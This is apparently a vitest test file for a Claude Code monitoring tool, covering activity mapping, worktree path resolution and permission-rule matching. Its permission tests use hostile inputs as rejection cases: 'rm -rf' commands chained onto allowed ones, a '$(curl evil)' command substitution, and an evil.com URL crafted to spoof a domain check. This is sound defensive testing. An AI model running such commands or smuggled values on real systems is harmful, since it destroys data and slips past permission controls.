import { describe, expect, it } from "vitest";
import { toRepoPath, toolActivity } from "../src/server/activity.js";
import { alwaysRuleFor, cliSafeRules, ruleMatches } from "../src/server/permissions.js";

describe("toolActivity", () => {
  it("maps tools to mascot activities", () => {
    expect(toolActivity("Read", { file_path: "/r/src/a.ts" }).activity).toBe("reading");
    expect(toolActivity("Edit", { file_path: "/r/src/a.ts" }).activity).toBe("building");
    expect(toolActivity("Grep", { pattern: "x", path: "src" }).activity).toBe("scouting");
    expect(toolActivity("Bash", { command: "npm test -- --run" }).activity).toBe("testing");
    expect(toolActivity("Bash", { command: "cd app && pytest -x" }).activity).toBe("testing");
    expect(toolActivity("Bash", { command: "git status" }).activity).toBe("commands");
    expect(toolActivity("WebSearch", { query: "q" }).activity).toBe("webrecon");
    expect(toolActivity("Task", { description: "explore" }).activity).toBe("directing");
    expect(toolActivity("AskUserQuestion", {}).activity).toBe("needs_you");
    expect(toolActivity("mcp__warroom__create_objective", {}).activity).toBe("directing");
    expect(toolActivity("mcp__warroom__report", {}).activity).toBe("reporting");
  });

  it("derives a target from glob patterns", () => {
    expect(toolActivity("Glob", { pattern: "src/web/**/*.tsx" }).rawPath).toBe("src/web");
    expect(toolActivity("Glob", { pattern: "**/*.ts" }).rawPath).toBeNull();
  });
});

describe("toRepoPath", () => {
  const root = "/repo";
  const wt = "/repo/.claude/worktrees/warroom-c-engineer-x1";
  it("maps worktree paths back onto the same building", () => {
    expect(toRepoPath(`${wt}/src/auth.ts`, wt, wt, root)).toBe("src/auth.ts");
    expect(toRepoPath("src/auth.ts", wt, wt, root)).toBe("src/auth.ts");
    expect(toRepoPath("/repo/src/auth.ts", root, root, root)).toBe("src/auth.ts");
  });
  it("ignores paths outside the theater", () => {
    expect(toRepoPath("/etc/hosts", root, root, root)).toBeNull();
    expect(toRepoPath(null, root, root, root)).toBeNull();
  });
});

describe("permission rules", () => {
  it("matches tool names, MCP servers and command globs", () => {
    expect(ruleMatches("Edit", "Edit", {})).toBe(true);
    expect(ruleMatches("Edit", "Write", {})).toBe(false);
    expect(ruleMatches("mcp__warroom", "mcp__warroom__report", {})).toBe(true);
    expect(ruleMatches("Bash(npm test*)", "Bash", { command: "npm test -- --run" })).toBe(true);
    expect(ruleMatches("Bash(npm test*)", "Bash", { command: "rm -rf /" })).toBe(false);
    expect(ruleMatches("Bash(npm test*)", "Bash", { command: "npm test; rm -rf ~" })).toBe(false);
    expect(ruleMatches("Bash(npm test*)", "Bash", { command: "npm test $(curl evil)" })).toBe(false);
    expect(ruleMatches("Bash(git status:*)", "Bash", { command: "git status --short" })).toBe(true);
    expect(ruleMatches("WebFetch(domain:docs.example.com)", "WebFetch", { url: "https://docs.example.com/a" })).toBe(true);
    expect(ruleMatches("WebFetch(domain:example.com)", "WebFetch", { url: "https://evil.com/?example.com" })).toBe(false);
  });

  it("builds the narrowest always-allow rule", () => {
    expect(alwaysRuleFor("Bash", { command: "npm run build" })).toBe("Bash(npm run build)");
    expect(alwaysRuleFor("WebFetch", { url: "https://x.dev/p" })).toBe("WebFetch(domain:x.dev)");
    expect(alwaysRuleFor("Edit", { file_path: "/a" })).toBe("Edit(/a)");
    expect(ruleMatches(alwaysRuleFor("Write", { file_path: "/repo/x.ts" })!, "Write", { file_path: "/repo/y.ts" })).toBe(false);
    // No exact rule is possible: approve once, remember nothing.
    expect(alwaysRuleFor("Bash", { command: "rm -rf dist/*" })).toBeNull();
    expect(alwaysRuleFor("Write", { file_path: "/repo/*.ts" })).toBeNull();
    expect(alwaysRuleFor("mcp__github__delete_repo", { repo: "x" })).toBeNull();
    // Claude Code splits --allowedTools on parentheses, so a rule can't hold any.
    expect(alwaysRuleFor("Bash", { command: "npm test # (x) Write (y)" })).toBeNull();
    expect(alwaysRuleFor("Write", { file_path: "/repo/a (copy).ts" })).toBeNull();
    expect(cliSafeRules(["Read", "mcp__warroom", "mcp__claude-in-chrome__navigate", "mcp__srv__*", "Bash(npm test)", "Bash(git status*)", "Bash(npm test # (x) Write (y))", "Bash(a", "Read Write"])).toEqual([
      "Read",
      "mcp__warroom",
      "mcp__claude-in-chrome__navigate",
      "mcp__srv__*",
      "Bash(npm test)",
      "Bash(git status*)",
    ]);
    expect(ruleMatches(alwaysRuleFor("Bash", { command: "npm run build" })!, "Bash", { command: "npm run build && rm -rf ~" })).toBe(false);
  });
});
